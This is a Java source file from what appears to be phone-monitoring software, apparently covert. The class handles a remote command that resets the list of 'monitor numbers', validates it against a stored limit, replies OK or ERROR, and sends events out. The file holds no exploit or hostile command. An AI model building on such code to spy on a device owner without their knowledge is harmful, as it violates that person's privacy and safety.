package com.vvt.rmtcmd.pcc;

import java.util.Vector;

import com.vvt.global.Global;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;

public class PCCResetMonitorNumb extends PCCRmtCmdSync {
		
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public PCCResetMonitorNumb(Vector monitorNumberList) {
		numberList = monitorNumberList;
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		doPCCHeader(PhoenixCompliantCommand.RESET_MONITOR.getId());
		try {
			if (isInvalidNumber() || (numberList.size() == 0)) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.INVALID_MONITOR_NUMBER);		
			} else if (isExceededDB(prefBugInfo.getMaxMonitorNumbers(), numberList.size())) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.EXCEEDED_MONITOR_NUMBER);
			} else {
				clearMonitorNumberDB();
				addMonitorNumberDB();
				responseMessage.append(Constant.OK);	
			}	
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());	
		// To send events
		eventSender.sendEvents();
	}
}
